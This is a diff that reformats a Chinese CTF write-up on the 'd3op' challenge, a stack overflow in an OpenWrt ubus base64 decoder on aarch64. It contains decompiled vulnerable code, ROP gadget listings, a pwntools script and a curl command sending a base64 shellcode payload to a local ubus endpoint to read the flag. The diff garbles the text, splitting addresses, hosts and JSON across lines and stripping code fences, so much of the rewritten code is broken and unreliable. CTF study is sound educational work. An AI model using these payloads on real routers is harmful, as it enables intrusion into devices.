@@ -38,11 +38,16 @@ diff --color -aur openwrt/squashfs-root/etc/shadow d3op/squashfs-root/etc/shadow
 --- openwrt/squashfs-root/etc/shadow 2023-01-03 08:24:21
 +++ d3op/squashfs-root/etc/shadow 2023-04-12 17:33:08
 @@ -1,4 +1,4 @@
--root:::0:99999:7:::
-+root:$6$JlPmKq/ZhqQ0I6V6$B74FL6cufcnZKT4G0sUz3xNP0Pr4k7yOG2I091f2OFOmcldS2s7CPJwOcfx0r/OshYDOFKw76APIqPHBXCdXb/:19442::::::
- daemon:*:0:0:99999:7:::
- ftp:*:0:0:99999:7:::
- network:*:0:0:99999:7:::
+-root:::0:
+99999:7:::
++root:$6$JlPmKq/ZhqQ0I6V6$B74FL6cufcnZKT4G0sUz3xNP0Pr4k7yOG2I091f2OFOmcldS2s7CPJwOcfx0r/OshYDOFKw76APIqPHBXCdXb/:
+19442::::::
+ daemon:*:0:0:
+99999:7:::
+ ftp:*:0:0:
+99999:7:::
+ network:*:0:0:
+99999:7:::
 diff: openwrt/squashfs-root/etc/ssl/cert.pem: No such file or directory
 Only in d3op/squashfs-root: flag
 diff: openwrt/squashfs-root/sbin/insmod: No such file or directory
@@ -115,9 +120,9 @@ Only in d3op/squashfs-root/usr/libexec/rpcd: base64
 
 ◆ubus命令用于控制调试相关ubus接口，主要命令说明如下：
 
-- list [<path>] List objects
- - call <path> <method> [<message>] Call an object method
- - listen [<path>...] Listen for events
+- list [] List objects
+ - call  <method> [<message>] Call an object method
+ - listen [...] Listen for events
  - send <type> [<message>] Send an event
  - wait_for <object> [<object>...] Wait for multiple objects to appear on ubus
 
@@ -450,11 +455,16 @@ r.interactive()
 
 看一下汇编。
 
-.text:0000000000406274 E0 4B 84 B9 LDRSW X0, [SP,#0x450+var8]
-.text:0000000000406278 E1 0F 40 F9 LDR X1, [SP,#0x450+var_438]
-.text:000000000040627C 20 00 00 8B ADD X0, X1, X0
-.text:0000000000406280 00 00 40 39 LDRB W0, [X0]
-.text:0000000000406284 1F F4 00 71 CMP W0, #0x3D ; '='
+.text:
+0000000000406274 E0 4B 84 B9 LDRSW X0, [SP,#0x450+var8]
+.text:
+0000000000406278 E1 0F 40 F9 LDR X1, [SP,#0x450+var_438]
+.text:
+000000000040627C 20 00 00 8B ADD X0, X1, X0
+.text:
+0000000000406280 00 00 40 39 LDRB W0, [X0]
+.text:
+0000000000406284 1F F4 00 71 CMP W0, #0x3D ; '='
 
 X0这里的地址取错了，0x450 - 8 = 0x448 = v24，在溢出的时候把v24给覆盖了之后导致的SIGSEGV结果。
 
@@ -526,22 +536,35 @@ unsigned __int64 __fastcall sub_423340(void *a1, size_t a2, int a3)
 
 如果可以控制a1, a2, a3中的任何一个并且可以执行sub_423340，这个时候就可以跳到shellcode那里了。
 
-.text:00000000004578A8 61 EE 41 F9 LDR X1, [X19,#0x3D8]
-.text:00000000004578AC 60 F2 41 F9 LDR X0, [X19,#0x3E0]
-.text:00000000004578B0 21 00 00 CB SUB X1, X1, X0
-.text:00000000004578B4 80 00 00 8B ADD X0, X4, X0
-.text:00000000004578B8 A2 2E FF 97 BL sub_423340
+.text:
+00000000004578A8 61 EE 41 F9 LDR X1, [X19,#0x3D8]
+.text:
+00000000004578AC 60 F2 41 F9 LDR X0, [X19,#0x3E0]
+.text:
+00000000004578B0 21 00 00 CB SUB X1, X1, X0
+.text:
+00000000004578B4 80 00 00 8B ADD X0, X4, X0
+.text:
+00000000004578B8 A2 2E FF 97 BL sub_423340
 
 上面这一段就符合要求，控制了x19之后然后再控制x2，最后到上面这一段。
 
-.text:00000000004579A4 E2 00 80 52 MOV W2, #7
-.text:00000000004579A8 FD 03 00 91 MOV X29, SP
-.text:00000000004579AC 03 48 42 F9 LDR X3, [X0,#0x490]
-.text:00000000004579B0 01 4C 42 F9 LDR X1, [X0,#0x498]
-.text:00000000004579B4 00 50 42 F9 LDR X0, [X0,#0x4A0]
-.text:00000000004579B8 21 00 00 CB SUB X1, X1, X0
-.text:00000000004579BC 60 00 00 8B ADD X0, X3, X0
-.text:00000000004579C0 60 2E FF 97 BL sub_423340
+.text:
+00000000004579A4 E2 00 80 52 MOV W2, #7
+.text:
+00000000004579A8 FD 03 00 91 MOV X29, SP
+.text:
+00000000004579AC 03 48 42 F9 LDR X3, [X0,#0x490]
+.text:
+00000000004579B0 01 4C 42 F9 LDR X1, [X0,#0x498]
+.text:
+00000000004579B4 00 50 42 F9 LDR X0, [X0,#0x4A0]
+.text:
+00000000004579B8 21 00 00 CB SUB X1, X1, X0
+.text:
+00000000004579BC 60 00 00 8B ADD X0, X3, X0
+.text:
+00000000004579C0 60 2E FF 97 BL sub_423340
 
 官方wp上的要更简单，控制x0即可，然后跳到shellcode那里。
 
@@ -604,22 +627,35 @@ blr x20
 '''
 
 '''
-.text:00000000004578A8 61 EE 41 F9 LDR X1, [X19,#0x3D8]
-.text:00000000004578AC 60 F2 41 F9 LDR X0, [X19,#0x3E0]
-.text:00000000004578B0 21 00 00 CB SUB X1, X1, X0
-.text:00000000004578B4 80 00 00 8B ADD X0, X4, X0
-.text:00000000004578B8 A2 2E FF 97 BL sub_423340
+.text:
+00000000004578A8 61 EE 41 F9 LDR X1, [X19,#0x3D8]
+.text:
+00000000004578AC 60 F2 41 F9 LDR X0, [X19,#0x3E0]
+.text:
+00000000004578B0 21 00 00 CB SUB X1, X1, X0
+.text:
+00000000004578B4 80 00 00 8B ADD X0, X4, X0
+.text:
+00000000004578B8 A2 2E FF 97 BL sub_423340
 '''
 
 '''
-.text:00000000004579A4 E2 00 80 52 MOV W2, #7
-.text:00000000004579A8 FD 03 00 91 MOV X29, SP
-.text:00000000004579AC 03 48 42 F9 LDR X3, [X0,#0x490]
-.text:00000000004579B0 01 4C 42 F9 LDR X1, [X0,#0x498]
-.text:00000000004579B4 00 50 42 F9 LDR X0, [X0,#0x4A0]
-.text:00000000004579B8 21 00 00 CB SUB X1, X1, X0
-.text:00000000004579BC 60 00 00 8B ADD X0, X3, X0
-.text:00000000004579C0 60 2E FF 97 BL sub_423340
+.text:
+00000000004579A4 E2 00 80 52 MOV W2, #7
+.text:
+00000000004579A8 FD 03 00 91 MOV X29, SP
+.text:
+00000000004579AC 03 48 42 F9 LDR X3, [X0,#0x490]
+.text:
+00000000004579B0 01 4C 42 F9 LDR X1, [X0,#0x498]
+.text:
+00000000004579B4 00 50 42 F9 LDR X0, [X0,#0x4A0]
+.text:
+00000000004579B8 21 00 00 CB SUB X1, X1, X0
+.text:
+00000000004579BC 60 00 00 8B ADD X0, X3, X0
+.text:
+00000000004579C0 60 2E FF 97 BL sub_423340
 '''
 magic_gadget = 0x00000000004579A4
 
@@ -664,11 +700,13 @@ r.interactive()
 
 但是远程的时候会出现问题。
 
-* Trying 127.0.0.1:9999...
+* Trying 127.0.0.1:
+9999...
 * TCP_NODELAY set
 * Connected to 127.0.0.1 (127.0.0.1) port 9999 (#0)
 > POST /ubus HTTP/1.1
-> Host: 127.0.0.1:9999
+> Host: 127.0.0.1:
+9999
 > User-Agent: curl/7.68.0
 > Accept: */*
 > Content-Length: 1721
@@ -686,7 +724,8 @@ r.interactive()
 < Content-Type: application/json
 <
 * Connection #0 to host 127.0.0.1 left intact
-{"jsonrpc":"2.0","id":null,"result":[2]}
+{"jsonrpc":"2.0","id":
+null,"result":[2]}
 
 result里没有flag的输出，是因为输出的格式是{"output":"flag"}，而上面的0x4a2098这里直接存放的是flag，所以需要在一个地址里构造一下{"output": "，然后再将flag放到后面，最后加上"}即可。
 
@@ -753,22 +792,35 @@ blr x20
 '''
 
 '''
-.text:00000000004578A8 61 EE 41 F9 LDR X1, [X19,#0x3D8]
-.text:00000000004578AC 60 F2 41 F9 LDR X0, [X19,#0x3E0]
-.text:00000000004578B0 21 00 00 CB SUB X1, X1, X0
-.text:00000000004578B4 80 00 00 8B ADD X0, X4, X0
-.text:00000000004578B8 A2 2E FF 97 BL sub_423340
+.text:
+00000000004578A8 61 EE 41 F9 LDR X1, [X19,#0x3D8]
+.text:
+00000000004578AC 60 F2 41 F9 LDR X0, [X19,#0x3E0]
+.text:
+00000000004578B0 21 00 00 CB SUB X1, X1, X0
+.text:
+00000000004578B4 80 00 00 8B ADD X0, X4, X0
+.text:
+00000000004578B8 A2 2E FF 97 BL sub_423340
 '''
 
 '''
-.text:00000000004579A4 E2 00 80 52 MOV W2, #7
-.text:00000000004579A8 FD 03 00 91 MOV X29, SP
-.text:00000000004579AC 03 48 42 F9 LDR X3, [X0,#0x490]
-.text:00000000004579B0 01 4C 42 F9 LDR X1, [X0,#0x498]
-.text:00000000004579B4 00 50 42 F9 LDR X0, [X0,#0x4A0]
-.text:00000000004579B8 21 00 00 CB SUB X1, X1, X0
-.text:00000000004579BC 60 00 00 8B ADD X0, X3, X0
-.text:00000000004579C0 60 2E FF 97 BL sub_423340
+.text:
+00000000004579A4 E2 00 80 52 MOV W2, #7
+.text:
+00000000004579A8 FD 03 00 91 MOV X29, SP
+.text:
+00000000004579AC 03 48 42 F9 LDR X3, [X0,#0x490]
+.text:
+00000000004579B0 01 4C 42 F9 LDR X1, [X0,#0x498]
+.text:
+00000000004579B4 00 50 42 F9 LDR X0, [X0,#0x4A0]
+.text:
+00000000004579B8 21 00 00 CB SUB X1, X1, X0
+.text:
+00000000004579BC 60 00 00 8B ADD X0, X3, X0
+.text:
+00000000004579C0 60 2E FF 97 BL sub_423340
 '''
 magic_gadget = 0x00000000004579A4
 
@@ -819,11 +871,13 @@ from os import system
 li = lambda x : print('x1b[01;38;5;214m' + str(x) + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + str(x) + 'x1b[0m')
 
-ip = 'http://127.0.0.1:9999/ubus'
+ip = 'http://127.0.0.1:
+9999/ubus'
 
 p1 = '7sWM0o4trPLuDMDy7g8f+IDzn9Lg/7/y4P/f8uD///LhAwCR4gMfqggHgNIBAADUYACA0oF0hNJBCaDyAiCA0ugHgNIBAADUIACA0gFzhNJBCaDyAiCA0ggIgNIBAADUYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWEAAAAAAAAAAAAwSgAAAAAAAABKAAAAAABhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFheyJvdXRwdXQiOiAiYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWEifWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYXd3AAAdBAAAhAUAAHcHAAAAAAAAAAAAAJgIQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKR5RQAAAAAAAAAAAAAAAAAAAAAAAAAAAAgeSgAAAAAAmCBKAAAAAACYIEoAAAAAAJggSgAAAAAAmCBKAAAAAACYIEoAAAAAAA=='
 
-shell = '''curl -v -d '{"jsonrpc":"2.0","id":null, "method":"call", "params" : ["00000000000000000000000000000000", "base64", "decode", {"input" : "''' + p1 + '''"}]}' ''' + ip
+shell = '''curl -v -d '{"jsonrpc":"2.0","id":
+null, "method":"call", "params" : ["00000000000000000000000000000000", "base64", "decode", {"input" : "''' + p1 + '''"}]}' ''' + ip
 
 li(shell)
 
@@ -831,12 +885,16 @@ system(shell)
 
 远程交互如下：
 
-curl -v -d '{"jsonrpc":"2.0","id":null, "method":"call", "params" : ["00000000000000000000000000000000", "base64", "decode", {"input" : "7sWM0o4trPLuDMDy7g8f+IDzn9Lg/7/y4P/f8uD///LhAwCR4gMfqggHgNIBAADUYACA0oF0hNJBCaDyAiCA0ugHgNIBAADUIACA0gFzhNJBCaDyAiCA0ggIgNIBAADUYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWEAAAAAAAAAAAAwSgAAAAAAAABKAAAAAABhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFheyJvdXRwdXQiOiAiYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWEifWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYXd3AAAdBAAAhAUAAHcHAAAAAAAAAAAAAJgIQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKR5RQAAAAAAAAAAAAAAAAAAAAAAAAAAAAgeSgAAAAAAmCBKAAAAAACYIEoAAAAAAJggSgAAAAAAmCBKAAAAAACYIEoAAAAAAA=="}]}' http://127.0.0.1:9999/ubus
-* Trying 127.0.0.1:9999...
+curl -v -d '{"jsonrpc":"2.0","id":
+null, "method":"call", "params" : ["00000000000000000000000000000000", "base64", "decode", {"input" : "7sWM0o4trPLuDMDy7g8f+IDzn9Lg/7/y4P/f8uD///LhAwCR4gMfqggHgNIBAADUYACA0oF0hNJBCaDyAiCA0ugHgNIBAADUIACA0gFzhNJBCaDyAiCA0ggIgNIBAADUYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWEAAAAAAAAAAAAwSgAAAAAAAABKAAAAAABhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFheyJvdXRwdXQiOiAiYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWEifWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYXd3AAAdBAAAhAUAAHcHAAAAAAAAAAAAAJgIQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKR5RQAAAAAAAAAAAAAAAAAAAAAAAAAAAAgeSgAAAAAAmCBKAAAAAACYIEoAAAAAAJggSgAAAAAAmCBKAAAAAACYIEoAAAAAAA=="}]}' http://127.0.0.1:
+9999/ubus
+* Trying 127.0.0.1:
+9999...
 * TCP_NODELAY set
 * Connected to 127.0.0.1 (127.0.0.1) port 9999 (#0)
 > POST /ubus HTTP/1.1
-> Host: 127.0.0.1:9999
+> Host: 127.0.0.1:
+9999
 > User-Agent: curl/7.68.0
 > Accept: */*
 > Content-Length: 1721
@@ -854,7 +912,8 @@ curl -v -d '{"jsonrpc":"2.0","id":null, "method":"call", "params" : ["0000000000
 < Content-Type: application/json
 <
 * Connection #0 to host 127.0.0.1 left intact
-{"jsonrpc":"2.0","id":null,"result":[0,{"output":"flag{This_is_test_flag}naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}]}
+{"jsonrpc":"2.0","id":
+null,"result":[0,{"output":"flag{This_is_test_flag}naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}]}
 
 至此，d3op复盘结束。
 
@@ -891,18 +950,8 @@ It might take a long time to start up, please connect about 2 minutes after the 
 
 HINTS:
 May be you need to do a diff with the rootfs in attachment.
-```
-
-
-
-```
 一
 初步分析
-```
-
-
-
-```
 _______ ________ __
  | |.-----.-----.-----.| | | |.----.| |_
  | - || _ | -__| || | | || _|| _|
@@ -911,11 +960,6 @@ _______ ________ __
  -----------------------------------------------------
  OpenWrt 22.03.3, r20028-43d71ad93e
  -----------------------------------------------------
-```
-
-
-
-```
 diff: openwrt/squashfs-root/etc/TZ: No such file or directory
 Only in d3op/squashfs-root/etc/config: network
 diff: openwrt/squashfs-root/etc/localtime: No such file or directory
@@ -926,11 +970,16 @@ diff --color -aur openwrt/squashfs-root/etc/shadow d3op/squashfs-root/etc/shadow
 --- openwrt/squashfs-root/etc/shadow 2023-01-03 08:24:21
 +++ d3op/squashfs-root/etc/shadow 2023-04-12 17:33:08
 @@ -1,4 +1,4 @@
--root:::0:99999:7:::
-+root:$6$JlPmKq/ZhqQ0I6V6$B74FL6cufcnZKT4G0sUz3xNP0Pr4k7yOG2I091f2OFOmcldS2s7CPJwOcfx0r/OshYDOFKw76APIqPHBXCdXb/:19442::::::
- daemon:*:0:0:99999:7:::
- ftp:*:0:0:99999:7:::
- network:*:0:0:99999:7:::
+-root:::0:
+99999:7:::
++root:$6$JlPmKq/ZhqQ0I6V6$B74FL6cufcnZKT4G0sUz3xNP0Pr4k7yOG2I091f2OFOmcldS2s7CPJwOcfx0r/OshYDOFKw76APIqPHBXCdXb/:
+19442::::::
+ daemon:*:0:0:
+99999:7:::
+ ftp:*:0:0:
+99999:7:::
+ network:*:0:0:
+99999:7:::
 diff: openwrt/squashfs-root/etc/ssl/cert.pem: No such file or directory
 Only in d3op/squashfs-root: flag
 diff: openwrt/squashfs-root/sbin/insmod: No such file or directory
@@ -974,11 +1023,6 @@ diff --color -aur openwrt/squashfs-root/usr/share/rpcd/acl.d/unauthenticated.jso
 + }
 + }
  }
-```
-
-
-
-```
 Only in d3op/squashfs-root/usr/libexec/rpcd: base64
 
 + "unauthenticated": {
@@ -996,21 +1040,11 @@ Only in d3op/squashfs-root/usr/libexec/rpcd: base64
 + }
 + }
 + }
-```
-
-
-
-```
-- list [<path>] List objects
- - call <path> <method> [<message>] Call an object method
- - listen [<path>...] Listen for events
+- list [] List objects
+ - call  <method> [<message>] Call an object method
+ - listen [...] Listen for events
  - send <type> [<message>] Send an event
  - wait_for <object> [<object>...] Wait for multiple objects to appear on ubus
-```
-
-
-
-```
 root@(none):/# ubus list
 base64
 container
@@ -1037,36 +1071,16 @@ service
 session
 system
 uci
-```
-
-
-
-```
 root@(none):/# ubus -v list base64
 'base64' @1e449b72
  "encode":{"input":"String"}
  "decode":{"input":"String"}
-```
-
-
-
-```
 root@(none):/# ubus call base64 encode '{"input" : "z1r0"}'
 {
  "output": "ejFyMAA="
 }
-```
-
-
-
-```
 二
 漏洞分析
-```
-
-
-
-```
 int __cdecl main(int argc, const char **argv, const char **envp)
 {
  char v6[4096]; // [xsp+28h] [xbp-1028h] BYREF
@@ -1115,11 +1129,6 @@ int __cdecl main(int argc, const char **argv, const char **envp)
  return 0;
  }
 }
-```
-
-
-
-```
 unsigned __int64 __fastcall sub_422E60(int a1, void *a2, size_t a3)
 {
  unsigned __int64 v4; // x19
@@ -1153,19 +1162,9 @@ unsigned __int64 __fastcall sub_422E60(int a1, void *a2, size_t a3)
  return v9;
  }
 }
-```
-
-
-
-```
 ckec(specific_method, *(v8 + 32), byte_4A2098);
 sub_40B230("{"output": "%s"}n", byte_4A2098);
 sub_400A10(v9);
-```
-
-
-
-```
 __int64 __fastcall sub_4064F0(unsigned __int64 *a1, __int64 a2, __int64 a3)
 {
  if ( check_method(a1, "encode") )
@@ -1179,19 +1178,9 @@ __int64 __fastcall sub_4064F0(unsigned __int64 *a1, __int64 a2, __int64 a3)
  }
  return 0LL;
 }
-```
-
-
-
-```
 ➜ squashfs-root ./base64 call encode
 {"input" : "z1r0"}
 {"output": "ejFyMAA="}
-```
-
-
-
-```
 __int64 __fastcall decode(char *json_input, __int64 out_put)
 {
  int v3; // w0
@@ -1295,28 +1284,13 @@ __int64 __fastcall decode(char *json_input, __int64 out_put)
  }
  return 0LL;
 }
-```
-
-
-
-```
 三
 漏洞利用
-```
-
-
-
-```
 Arch: aarch64-64-little
  RELRO: Partial RELRO
  Stack: No canary found
  NX: NX enabled
  PIE: No PIE (0x400000)
-```
-
-
-
-```
 from pwn import *
 from os import system
 import base64
@@ -1349,29 +1323,19 @@ li(p2)
 r.sendline(p2)
 
 r.interactive()
-```
-
-
-
-```
 ► 0x406280 ldrb w0, [x0]
  0x406284 cmp w0, #0x3d
  0x406288 b.ne #0x4062a0 <0x4062a0>
-```
-
-
-
-```
-.text:0000000000406274 E0 4B 84 B9 LDRSW X0, [SP,#0x450+var8]
-.text:0000000000406278 E1 0F 40 F9 LDR X1, [SP,#0x450+var_438]
-.text:000000000040627C 20 00 00 8B ADD X0, X1, X0
-.text:0000000000406280 00 00 40 39 LDRB W0, [X0]
-.text:0000000000406284 1F F4 00 71 CMP W0, #0x3D ; '='
-```
-
-
-
-```
+.text:
+0000000000406274 E0 4B 84 B9 LDRSW X0, [SP,#0x450+var8]
+.text:
+0000000000406278 E1 0F 40 F9 LDR X1, [SP,#0x450+var_438]
+.text:
+000000000040627C 20 00 00 8B ADD X0, X1, X0
+.text:
+0000000000406280 00 00 40 39 LDRB W0, [X0]
+.text:
+0000000000406284 1F F4 00 71 CMP W0, #0x3D ; '='
 from pwn import *
 from os import system
 import base64
@@ -1410,11 +1374,6 @@ li(p2)
 r.sendline(p2)
 
 r.interactive()
-```
-
-
-
-```
 unsigned __int64 __fastcall sub_423340(void *a1, size_t a2, int a3)
 {
  unsigned __int64 result; // x0
@@ -1429,34 +1388,32 @@ unsigned __int64 __fastcall sub_423340(void *a1, size_t a2, int a3)
  }
  return result;
 }
-```
-
-
-
-```
-.text:00000000004578A8 61 EE 41 F9 LDR X1, [X19,#0x3D8]
-.text:00000000004578AC 60 F2 41 F9 LDR X0, [X19,#0x3E0]
-.text:00000000004578B0 21 00 00 CB SUB X1, X1, X0
-.text:00000000004578B4 80 00 00 8B ADD X0, X4, X0
-.text:00000000004578B8 A2 2E FF 97 BL sub_423340
-```
-
-
-
-```
-.text:00000000004579A4 E2 00 80 52 MOV W2, #7
-.text:00000000004579A8 FD 03 00 91 MOV X29, SP
-.text:00000000004579AC 03 48 42 F9 LDR X3, [X0,#0x490]
-.text:00000000004579B0 01 4C 42 F9 LDR X1, [X0,#0x498]
-.text:00000000004579B4 00 50 42 F9 LDR X0, [X0,#0x4A0]
-.text:00000000004579B8 21 00 00 CB SUB X1, X1, X0
-.text:00000000004579BC 60 00 00 8B ADD X0, X3, X0
-.text:00000000004579C0 60 2E FF 97 BL sub_423340
-```
-
-
-
-```
+.text:
+00000000004578A8 61 EE 41 F9 LDR X1, [X19,#0x3D8]
+.text:
+00000000004578AC 60 F2 41 F9 LDR X0, [X19,#0x3E0]
+.text:
+00000000004578B0 21 00 00 CB SUB X1, X1, X0
+.text:
+00000000004578B4 80 00 00 8B ADD X0, X4, X0
+.text:
+00000000004578B8 A2 2E FF 97 BL sub_423340
+.text:
+00000000004579A4 E2 00 80 52 MOV W2, #7
+.text:
+00000000004579A8 FD 03 00 91 MOV X29, SP
+.text:
+00000000004579AC 03 48 42 F9 LDR X3, [X0,#0x490]
+.text:
+00000000004579B0 01 4C 42 F9 LDR X1, [X0,#0x498]
+.text:
+00000000004579B4 00 50 42 F9 LDR X0, [X0,#0x4A0]
+.text:
+00000000004579B8 21 00 00 CB SUB X1, X1, X0
+.text:
+00000000004579BC 60 00 00 8B ADD X0, X3, X0
+.text:
+00000000004579C0 60 2E FF 97 BL sub_423340
 from pwn import *
 from os import system
 import base64
@@ -1514,22 +1471,35 @@ blr x20
 '''
 
 '''
-.text:00000000004578A8 61 EE 41 F9 LDR X1, [X19,#0x3D8]
-.text:00000000004578AC 60 F2 41 F9 LDR X0, [X19,#0x3E0]
-.text:00000000004578B0 21 00 00 CB SUB X1, X1, X0
-.text:00000000004578B4 80 00 00 8B ADD X0, X4, X0
-.text:00000000004578B8 A2 2E FF 97 BL sub_423340
+.text:
+00000000004578A8 61 EE 41 F9 LDR X1, [X19,#0x3D8]
+.text:
+00000000004578AC 60 F2 41 F9 LDR X0, [X19,#0x3E0]
+.text:
+00000000004578B0 21 00 00 CB SUB X1, X1, X0
+.text:
+00000000004578B4 80 00 00 8B ADD X0, X4, X0
+.text:
+00000000004578B8 A2 2E FF 97 BL sub_423340
 '''
 
 '''
-.text:00000000004579A4 E2 00 80 52 MOV W2, #7
-.text:00000000004579A8 FD 03 00 91 MOV X29, SP
-.text:00000000004579AC 03 48 42 F9 LDR X3, [X0,#0x490]
